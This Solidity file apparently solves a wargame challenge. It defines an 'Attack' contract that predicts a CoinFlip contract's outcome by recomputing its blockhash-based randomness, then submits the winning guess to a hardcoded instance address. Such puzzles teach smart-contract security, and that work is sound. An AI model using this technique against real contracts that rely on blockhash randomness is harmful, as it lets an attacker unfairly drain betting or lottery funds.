//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

/**
 * @dev Deploy with a proper CoinFlip instance,
 * then call flip 10 times, each time in a new block 
 */
contract Attack{
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    // Instance address
    ICoinFlip constant cf = ICoinFlip(0x9195C3B11A09525BB3242A3C288775AE1e9553a5);

    function flip() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        cf.flip(coinFlip == 1);
    }
}